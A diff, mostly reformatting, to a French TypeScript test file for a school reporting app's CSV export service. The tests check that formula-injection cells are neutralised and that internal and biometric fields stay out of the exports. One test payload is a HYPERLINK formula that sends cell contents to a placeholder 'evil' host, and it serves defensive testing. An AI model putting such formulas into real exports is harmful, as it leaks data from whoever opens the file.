@@ -2,22 +2,15 @@ import { ExportService, cellule } from './export.service';
 
 /** Contenu réel de la cellule, une fois retiré l'éventuel guillemet CSV. */
 function contenu(csv: string): string {
-  return csv.startsWith('"') && csv.endsWith('"')
-    ? csv.slice(1, -1).replace(/""/g, '"')
-    : csv;
+  return csv.startsWith('"') && csv.endsWith('"') ? csv.slice(1, -1).replace(/""/g, '"') : csv;
 }
 
-describe('cellule d\'export CSV', () => {
+describe("cellule d'export CSV", () => {
   it('neutralise une formule injectée en tête de cellule', () => {
     // Un nom d'enseignant ou un intitulé de séance est saisi librement. Une
     // cellule commençant par l'un de ces caractères est lue comme une formule
     // par Excel et LibreOffice, dans le contexte de qui ouvre l'export.
-    for (const charge of [
-      '=HYPERLINK("http://evil/?d="&A1,"clic")',
-      '+1+1',
-      '-2+3',
-      '@SUM(A1)',
-    ]) {
+    for (const charge of ['=HYPERLINK("http://evil/?d="&A1,"clic")', '+1+1', '-2+3', '@SUM(A1)']) {
       // Ce qui compte est le premier caractère vu par le tableur, pas la
       // présence d'un guillemet CSV autour.
       expect(contenu(cellule(charge))[0]).toBe("'");
@@ -55,12 +48,26 @@ describe('projections des exports de rapports', () => {
   it('exporte les colonnes de présence sans données internes supplémentaires', async () => {
     const rapports = {
       presenceEnseignants: jest.fn().mockResolvedValue({
-        lignes: [{
-          matricule: 'ENS-01', nom: '=HYPERLINK("x")', grade: 'Maître', statutEnseignant: 'ACTIF',
-          departement: 'Informatique', planifiees: 4, controlees: 3, assurees: 2, retard: 1,
-          absent: 0, excuse: 0, heuresPrevues: 8, heuresRealisees: 6, tauxPresence: 66.7,
-          tauxControle: 75, secretInterne: 'masqué',
-        }],
+        lignes: [
+          {
+            matricule: 'ENS-01',
+            nom: '=HYPERLINK("x")',
+            grade: 'Maître',
+            statutEnseignant: 'ACTIF',
+            departement: 'Informatique',
+            planifiees: 4,
+            controlees: 3,
+            assurees: 2,
+            retard: 1,
+            absent: 0,
+            excuse: 0,
+            heuresPrevues: 8,
+            heuresRealisees: 6,
+            tauxPresence: 66.7,
+            tauxControle: 75,
+            secretInterne: 'masqué',
+          },
+        ],
       }),
     };
     const service = new ExportService(rapports as never);
@@ -76,11 +83,22 @@ describe('projections des exports de rapports', () => {
   it('exporte le volume horaire à partir des lignes de rapport', async () => {
     const rapports = {
       volumeHoraire: jest.fn().mockResolvedValue({
-        lignes: [{
-          enseignant: 'Awa Barry', departement: 'Sciences', codeMatiere: 'MAT-01', matiere: 'Analyse',
-          promotion: 'L1', volumeHorairePrevu: 20, heuresRealisees: 12, reste: 8,
-          planifiees: 10, assurees: 6, tauxContrat: 60, secretInterne: 'masqué',
-        }],
+        lignes: [
+          {
+            enseignant: 'Awa Barry',
+            departement: 'Sciences',
+            codeMatiere: 'MAT-01',
+            matiere: 'Analyse',
+            promotion: 'L1',
+            volumeHorairePrevu: 20,
+            heuresRealisees: 12,
+            reste: 8,
+            planifiees: 10,
+            assurees: 6,
+            tauxContrat: 60,
+            secretInterne: 'masqué',
+          },
+        ],
       }),
     };
     const service = new ExportService(rapports as never);
@@ -96,11 +114,18 @@ describe('projections des exports de rapports', () => {
   it('exporte l’état de paiement et son total calculé', async () => {
     const rapports = {
       etatPaiement: jest.fn().mockResolvedValue({
-        lignes: [{
-          matricule: 'ENS-02', nom: 'Mamadou Diallo', statutEnseignant: 'VACATAIRE',
-          departement: 'Mathématiques', seancesAssurees: 3, heuresRealisees: 4.5,
-          tauxHoraire: 100000, montant: 450000,
-        }],
+        lignes: [
+          {
+            matricule: 'ENS-02',
+            nom: 'Mamadou Diallo',
+            statutEnseignant: 'VACATAIRE',
+            departement: 'Mathématiques',
+            seancesAssurees: 3,
+            heuresRealisees: 4.5,
+            tauxHoraire: 100000,
+            montant: 450000,
+          },
+        ],
         totalHeures: 4.5,
         totalMontant: 450000,
       }),
@@ -117,13 +142,29 @@ describe('projections des exports de rapports', () => {
   it('n’inclut pas la signature biométrique ni les champs non listés dans le registre CSV', async () => {
     const rapports = {
       registre: jest.fn().mockResolvedValue({
-        lignes: [{
-          date: '2026-09-12', horaire: '08:00 - 10:00', matricule: 'ENS-03', enseignant: 'Fatou Camara',
-          matiere: 'Physique', promotion: 'L2', salle: 'B12', type: 'COURS', statut: 'PRESENT',
-          heureArrivee: '08:02', heureFinReelle: '10:00', dureeMinutes: 118, effectifPresent: 24,
-          thematiqueTraitee: 'Optique', observation: 'RAS', methode: 'QR', attestation: 'OUI',
-          justificatif: '', signatureBase64: 'signature-confidentielle',
-        }],
+        lignes: [
+          {
+            date: '2026-09-12',
+            horaire: '08:00 - 10:00',
+            matricule: 'ENS-03',
+            enseignant: 'Fatou Camara',
+            matiere: 'Physique',
+            promotion: 'L2',
+            salle: 'B12',
+            type: 'COURS',
+            statut: 'PRESENT',
+            heureArrivee: '08:02',
+            heureFinReelle: '10:00',
+            dureeMinutes: 118,
+            effectifPresent: 24,
+            thematiqueTraitee: 'Optique',
+            observation: 'RAS',
+            methode: 'QR',
+            attestation: 'OUI',
+            justificatif: '',
+            signatureBase64: 'signature-confidentielle',
+          },
+        ],
       }),
     };
     const service = new ExportService(rapports as never);
